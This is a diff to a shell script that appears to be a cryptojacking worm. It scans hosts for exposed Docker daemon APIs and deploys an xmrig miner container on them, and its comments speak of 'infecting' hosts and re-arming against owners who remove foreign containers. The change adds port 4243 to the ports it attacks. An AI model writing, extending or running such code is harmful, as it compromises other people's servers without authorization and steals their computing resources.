@@ -36,7 +36,7 @@ IMAGE="${DOCK_IMAGE:-xmrig/xmrig}"
 MAX="${E_MAX:-${DOCK_MAX_HOSTS:-120}}"      # hosts scanned per run
 PAR="${E_PAR:-${DOCK_PAR:-20}}"             # concurrent probes
 RETRY="${DOCK_RETRY:-604800}"     # rescAN a dead host after 7d
-PORTS="${DOCK_PORTS:-2375 2376}"
+PORTS="${DOCK_PORTS:-2375 2376 4243}"
 SKIPSELF="${E_SELF:-${DOCK_SKIP_SELF:-yes}}"   # don't stack a container on our own daemon
 # ---- re-arm: the difference between infecting and KEEPING --------------------
 # Measured on this population: a slice of the boxes prunes foreign containers AND
@@ -98,7 +98,7 @@ BODY="{\"Image\":\"$IMAGE\",\"Cmd\":[$CMDS],\"Labels\":{$TAG},\"HostConfig\":{\"
 endpoint() {
     for p in $PORTS; do
         case "$p" in
-            2375) b="http://$1:2375";  o="" ;;
+            2375|4243) b="http://$1:$p";  o="" ;;
             2376) b="https://$1:2376"; o="-k" ;;
             *) continue ;;
         esac
